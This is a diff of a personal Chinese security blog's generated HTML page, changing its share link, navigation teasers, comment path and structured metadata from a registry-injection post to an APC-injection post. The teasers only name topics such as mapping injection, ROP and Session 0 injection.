-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://e1ectr0nlc.github.io/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/&title= - e1ectr0nlc's Blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/&title=APC注入 - e1ectr0nlc's Blog&summary=APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。"
           
           >
           
@@ -2498,15 +2562,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2024/04/28/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>2024年4月28日</p>
-          <p class='content'>概念映射注入是一种内存注入技术，创建的Mapping对象本质上属于申请一块物理内存，而物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存中，就避免使用一些经典函数例如VirtualAll...</p>
+        <a class='prev' href='/2023/10/12/Rop/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>基础ROP</p>
+          <p class='content'>线下比赛多为AWD，涉及到逆向的知识点很少。为了在线下不坐牢指打开电脑无所事事疯狂偷吃茶歇区零食 ，来记录自己学习pwn的入门知识
+
+
+
+
+保护Canary是一种栈溢出保护机制。在函数返回前会检...</p>
         </a>
       
       
-        <a class='next' href='/2024/04/28/APC%E6%B3%A8%E5%85%A5/'>
-          <p class='title'>2024年4月28日<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>APC注入概念首先来了解下什么是APC技术。APC全称为异步过程调用，它允许一个线程请求另一个线程在适当的时候异步执行一个特定的函数。通俗来讲，当一个线程调用一个阻塞的系统调用时，例如Sleep...</p>
+        <a class='next' href='/2023/07/18/%E7%AA%81%E7%A0%B4Session0%E7%9A%84%E6%B3%A8%E5%85%A5/'>
+          <p class='title'>绕过Session0进行注入<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>引入Session概念后，我们无法通过注入服务进程来实现可信任进程注入。当我们尝试注入session0当中的进程通常会失败，就是因为我们所处的session与系统服务进程不在同一个session...</p>
         </a>
       
     </div>
@@ -2522,7 +2591,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2023/07/20/APC%E6%B3%A8%E5%85%A5/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -2564,7 +2633,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-text">实现思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">代码实现</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF"><span class="toc-text">实现思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81"><span class="toc-text">代码</span></a></li></ol>
     </div>
   </section>
 
@@ -2620,7 +2689,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -3151,7 +3220,7 @@ document.addEventListener("DOMContentLoaded", function () {
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"e1ectr0nlc's Blog","url":"https://e1ectr0nlc.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"e1ectr0nlc","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://e1ectr0nlc.github.io/","sameAs":["https://github.com/volantis-x"],"description":"学习记录"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://e1ectr0nlc.github.io/","name":"e1ectr0nlc's Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://e1ectr0nlc.github.io/2024/04/28/注册表注入/"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"e1ectr0nlc's Blog","url":"https://e1ectr0nlc.github.io/","keywords":null,"description":"学习记录","author":{"@type":"Person","name":"e1ectr0nlc","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://e1ectr0nlc.github.io/","description":"学习记录"},"publisher":{"@type":"Organization","name":"e1ectr0nlc's Blog","url":"https://e1ectr0nlc.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://e1ectr0nlc.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"学习记录","inLanguage":"zh_CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1ectr0nlc.github.io/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/"},"author":{"@type":"Person","name":"e1ectr0nlc","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://e1ectr0nlc.github.io/"},"publisher":{"@type":"Organization","name":"e1ectr0nlc's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://e1ectr0nlc.github.io/2024/04/28/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/","wordCount":0,"datePublished":"2024-04-28T08:30:39.615Z","dateModified":"2024-05-12T12:13:09.813Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"e1ectr0nlc's Blog","url":"https://e1ectr0nlc.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"e1ectr0nlc","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://e1ectr0nlc.github.io/","sameAs":["https://github.com/volantis-x"],"description":"学习记录"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://e1ectr0nlc.github.io/","name":"e1ectr0nlc's Blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://e1ectr0nlc.github.io/categories/Dll注入/","name":"Dll注入"}},{"@type":"ListItem","position":3,"item":{"@id":"https://e1ectr0nlc.github.io/2023/07/20/APC注入/","name":"APC注入"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"e1ectr0nlc's Blog","url":"https://e1ectr0nlc.github.io/","keywords":null,"description":"学习记录","author":{"@type":"Person","name":"e1ectr0nlc","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://e1ectr0nlc.github.io/","description":"学习记录"},"publisher":{"@type":"Organization","name":"e1ectr0nlc's Blog","url":"https://e1ectr0nlc.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://e1ectr0nlc.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"APC注入","description":"APC注入利用了当前线程从中断中恢复时会检查APC队列中是否有函数未执行进行函数调用来注入。","inLanguage":"zh_CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/"},"author":{"@type":"Person","name":"e1ectr0nlc","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://e1ectr0nlc.github.io/"},"publisher":{"@type":"Organization","name":"e1ectr0nlc's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://e1ectr0nlc.github.io/2023/07/20/APC%E6%B3%A8%E5%85%A5/","wordCount":46,"datePublished":"2023-07-19T16:00:00.000Z","dateModified":"2024-05-12T13:15:08.956Z","articleSection":"Dll注入","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
